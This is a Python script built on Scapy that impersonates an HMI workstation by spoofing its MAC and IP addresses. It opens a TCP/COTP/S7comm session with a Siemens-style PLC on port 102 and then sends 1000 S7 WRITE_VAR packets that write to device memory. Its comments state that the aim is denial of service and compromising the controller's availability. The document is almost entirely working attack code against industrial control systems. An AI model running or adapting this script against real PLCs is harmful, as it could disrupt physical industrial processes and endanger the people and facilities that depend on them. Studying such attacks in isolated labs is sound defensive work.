# Script to establish a new connection

from scapy.all import *
from tpkt import TPKT
from cotp import COTP, COTP_TCP_Data, COTP_TCP_ConnectRequest
from s7 import *

import random
import time
import os
import json

# Defining the script variables 

PROJECT_PATH = os.path.dirname(os.path.abspath(__file__))

with open(os.path.join(PROJECT_PATH,"addresses.json"), "r") as f:
    ADDRESSES = json.load(f)

srcEth = ADDRESSES["srcEth"] # HMI MAC
dstEth = ADDRESSES["dstEth"]# PLC MAC
srcIP  = ADDRESSES["srcIP"] # HMI IP
dstIP  = ADDRESSES["dstIP"]# PLC IP
srcPort = random.randint(1024, 65535)
dstPort = 102 # iso_tsap port
seqNr = 0
ackNr = 0

def updateSeqAndAckNrs(pkt):
    global seqNr
    global ackNr

    # Keeping track of tcp sequence and acknowledge numbers
    seqNr = pkt[TCP].ack
    ackNr = pkt[TCP].seq + len(pkt[TCP].payload)

def sendAck():
    global seqNr
    global ackNr

    # Create the acknowledge packet
    ip      = IP(src=srcIP, dst=dstIP)
    ACK     = TCP(sport=srcPort, dport=dstPort, flags='A',seq=seqNr, ack=ackNr) # A = ACK
    ether = Ether(type=0x0800,src=srcEth,dst=dstEth) # 0x0800 -> IPv4
    pktACK  = ether / ip / ACK

    # Send acknowledge packet
    pktACK.show()
    sendp(pktACK)

def tcpHandshake():
    # Establish a connection with the server by means of the tcp three-way handshake
    global seqNr
    global ackNr

    # Create SYN packet
    ip      = IP(src=srcIP, dst=dstIP)
    SYN     = TCP(sport=srcPort, dport=dstPort, flags='S',seq=seqNr, ack=ackNr, window = int(2**16/2)) # S = SYN

    # Scapy sets your PC MAC address as source -> We force the HMI MAC address
    ether = Ether(type=0x0800,src=srcEth,dst=dstEth) # 0x0800 -> IPv4
    pktSYN  = ether / ip / SYN

    # Send SYN packet and receive SYN/ACK packet
    pktSYN.show()
    pktSYNACK = srp1(pktSYN) # srp1 is the same as sr1 but you can specify layer 2
    pktSYNACK.show()

    # Create the ACK packet
    ackNr   = pktSYNACK.seq + 1
    seqNr   = pktSYNACK.ack 
    ACK     = TCP(sport=srcPort, dport=dstPort, flags='A', seq=seqNr, ack=ackNr) # A = ACK
    
    pktACK = ether / ip / ACK
    pktACK.show()
    time.sleep(0.5)
    sendp(pktACK)

def endConnection():
    # Create the rst packet
    ip = IP(src=srcIP, dst=dstIP)
    RST = TCP(sport=srcPort, dport=dstPort, flags='RA',seq=seqNr, ack=ackNr, window = int(2**16/2)) # RA = RESET, ACK
    ether = Ether(type=0x0800,src=srcEth,dst=dstEth) # 0x0800 -> IPv4
    pktRST = ether / ip / RST

    # Send reset packet
    pktRST.show()
    send(pktRST)


def setup_cotp():
    global seqNr
    global ackNr

    # Create COTP SETUP packet
    ether = Ether(type=0x0800, src=srcEth, dst = dstEth) # 0x0800 -> IPv4
    ip = IP(src = srcIP, dst = dstIP, ttl = 128, id = random.randint(1, 65535), flags = 'DF') # DF = DON'T FRAGMENT
    tcp = TCP(sport = srcPort, dport = dstPort, seq = seqNr, ack = ackNr, flags = 'PA') # PA = PUSH, ACK

    # Hardcoded from a valid packet sniffed with Wireshark
    tpkt = TPKT(length=22)
    cotp = COTP(length=17,pdu_type=0xe0)
    cotp_setup = COTP_TCP_ConnectRequest(src_ref=0x0021, tpdu_size_value = 0x0a,src_tsap_value=0x0200,dst_tsap_value=0x0202)

    pkt = ether / ip / tcp / tpkt / cotp / cotp_setup

    pkt.show2() # Show assembled packet
    pktCOTP = srp1(pkt) # srp1 is the same as sr1 but you can specify layer 2

    time.sleep(0.5)

    # Update packet's sequence and acknowledge numbers before sending
    updateSeqAndAckNrs(pktCOTP)
    #sendAck()

def setup_s7comm():
    global seqNr
    global ackNr

    # Create S7COMM SETUP packet
    ether = Ether(type=0x0800, src=srcEth, dst = dstEth) # 0x0800 -> IPv4
    ip = IP(src = srcIP, dst = dstIP, ttl = 128, id = random.randint(1, 65535), flags = 'DF') # DF = DON'T FRAGMENT
    tcp = TCP(sport = srcPort, dport = dstPort, seq = seqNr, ack = ackNr, flags = 'PA') # PA = PUSH, ACK

    # Hardcoded from a valid packet sniffed with Wireshark
    tpkt = TPKT(length=25)
    cotp = COTP(length=2,pdu_type=0xf0)
    cotp_data = COTP_TCP_Data(last_data_unit=1, tpdu_num=0x00)
    s7comm = S7COMM(protocol_id = 0x32,rosctr = 1,reserved = 0x00,pdu_ref = 0x0100,param_length=0x08,data_length=0x0)
    s7commJob = S7COMM_Job(function=0xf0)
    s7commjobconnect = S7COMM_Job_Connect()
    pkt = ether / ip / tcp / tpkt / cotp / cotp_data / s7comm / s7commJob / s7commjobconnect

    pkt.show2() # Show assembled packet
    pktS7Comm = srp1(pkt) # srp1 is the same as sr1 but you can specify layer 2

    time.sleep(0.5)

    # Update packet's sequence and acknowledge numbers before sending
    updateSeqAndAckNrs(pktS7Comm)
    #sendAck()

def setup_s7comm_cpufunc():
    global seqNr
    global ackNr

    # Create S7COMM CPU FUNCTIONS SETUP packet
    ether = Ether(type=0x0800, src=srcEth, dst = dstEth) # 0x0800 -> IPv4
    ip = IP(src = srcIP, dst = dstIP, ttl = 128, id = random.randint(1, 65535), flags = 'DF') # DF = DON'T FRAGMENT
    tcp = TCP(sport = srcPort, dport = dstPort, seq = seqNr, ack = ackNr, flags = 'PA') # PA = PUSH, ACK

    # Hardcoded from a valid packet sniffed with Wireshark
    tpkt = TPKT(length=33)
    cotp = COTP(length=2,pdu_type=0xf0)
    cotp_data = COTP_TCP_Data(last_data_unit=1, tpdu_num=0x00)
    s7comm = S7COMM(protocol_id = 0x32,rosctr = 7,reserved = 0x0000,pdu_ref = 0x0100,param_length=0x0008,data_length=0x0008)
    s7commData = S7COMM_Data()
    s7commDataSZL = S7COMM_Data_ReadSZL(szl_id = 0x0131,szl_ind = 0x0003)

    pkt = ether / ip / tcp / tpkt / cotp / cotp_data / s7comm / s7commData / s7commDataSZL

    pkt.show2() # Show assembled packet
    pktS7Comm_func = srp1(pkt) # srp1 is the same as sr1 but you can specify layer 2

    time.sleep(0.5)

    # Update packet's sequence and acknowledge numbers before sending
    updateSeqAndAckNrs(pktS7Comm_func)
    sendAck()

# TCP PACKET REASSEMBLED PDU ERROR IS DUE TO WRONG PACKET LENGTH (TPKT)

def connectedSend():
    global seqNr
    global ackNr

    # Create S7COMM WRITE_VAR PACKET to send until DoS
    ether = Ether(type=0x0800, src=srcEth, dst = dstEth) # 0x0800 -> IPv4
    ip = IP(src = srcIP, dst = dstIP, ttl = 128, id = random.randint(1, 65535), flags = 'DF') # DF = DON'T FRAGMENT
    tcp = TCP(sport = srcPort, dport = dstPort, seq = seqNr, ack = ackNr, flags = 'PA') # PA = PUSH, ACK

    # Hardcoded from a valid packet sniffed with Wireshark
    tpkt = TPKT(length=36)
    cotp = COTP(length=2,pdu_type=0xf0)
    cotp_data = COTP_TCP_Data(last_data_unit=1, tpdu_num=0x00)
    s7comm = S7COMM(protocol_id = 0x32,rosctr = 1,reserved = 0x0000,pdu_ref = 0x0100,param_length=14,data_length=5)
    s7commJob = S7COMM_Job_Item(function=0x05)
    s7commItem = S7COMM_Item(varspec = 0x12, varspec_length = 10, syntaxid = 0x10, transp_size = 1, length = 1, db = 0, area = 0x83, addressBit = 0x0003e0)
    s7commDataItem = S7COMM_Data_Item (returncode = 0x00, transportsize = 0x03, length = 1, data = 1)
    pkt = ether / ip / tcp / tpkt / cotp / cotp_data / s7comm / s7commJob / s7commItem / s7commDataItem

    pkt.show2() # Show assembled packet
    pktRcv = srp1(pkt) # srp1 is the same as sr1 but you can specify layer 2

    time.sleep(0.1)

    # Update packet's sequence and acknowledge numbers before sending
    updateSeqAndAckNrs(pktRcv)
    sendAck()

    return pkt

# 1. TCP HANDSHAKE
tcpHandshake()

# 2. COTP SETUP
setup_cotp()

# 3. S7COMM SETUP
setup_s7comm()

# 4. S7COMM CPU FUNCTIONS SETUP
setup_s7comm_cpufunc()

# 5. WRITE_VAR PACKETS TO COMPROMISE AVAILABILITY OF THE DESTINATION DEVICE
for i in range(1000): # Number of iterations can be modified
    time.sleep(0.1)
    connectedSend()



